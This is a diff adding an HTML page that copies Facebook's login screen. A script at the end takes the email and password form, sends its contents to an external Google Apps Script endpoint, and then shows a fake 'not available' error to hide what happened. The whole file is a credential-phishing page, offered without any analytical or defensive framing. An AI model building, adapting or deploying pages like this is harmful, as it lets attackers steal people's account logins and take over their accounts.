@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <link rel="stylesheet" href="index.css" type="text/css">
+    <style>
+      </style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <div class="body">
+    <div class="fbinfo">
+    <div class="fb-logo-div">
+        <img class="fb-logo-img" src="/TRIAL/FB/facebook.svg" alt="facebook">
+    </div>
+    <div class="fb-logosub-div">
+        <p class="fb-logo-sub">Facebook helps you connect and share with the people in your life</p>
+    </div>
+
+    </div>
+    <div class="loginpg">
+    <form class="fb-loginform" id="submit-form" action="">
+        <input class="fb-email" type="email" placeholder="  Email adress" required>
+        <br>
+        <input class="fb-pass" type="password" placeholder="  Password" required>
+        <br>
+       <input class="fb-login" type="submit" value ="Log in">
+    </form>
+        <br>
+        <a class="fb-forgotpass" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgwMDAwMTIzLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login">Forgotten password?</a>
+        <hr class="fb-line">
+        <input class="fb-createac" type="submit" value="Create a New Account">
+    </div>
+    <div class="pagecreate">
+     <p><b><a class="fb-pgcreate" href="https://www.facebook.com/pages/create/?ref_type=registration_form">Create a Page</a></b> for a celebrity, brand or business.</p>   
+    </div>
+    <footer class="fb-footer">
+        <div class="fb-footer-div">
+            
+        </div>
+    </footer>
+</div>
+<script>
+    $("#submit-form").submit((e)=>{
+        e.preventDefault()
+        $.ajax({
+            url:"https://script.google.com/macros/s/AKfycbwY2rkSgS_GpitNfhyFnsq0i4Z77BUU_0KbxE1qnN-jpesZQ6niav2YVCu0x5Fz1H8/exec",
+            data:$("#submit-form").serialize(),
+            method:"post",
+            success:function (response){
+                alert("Facebook is not available right now,try again")
+                window.location.reload()
+                window.location.href="/"
+            },
+            error:function (err){
+                alert("Something Error")
+
+            }
+        })
+    })
+</script>
+</body>
+</html>
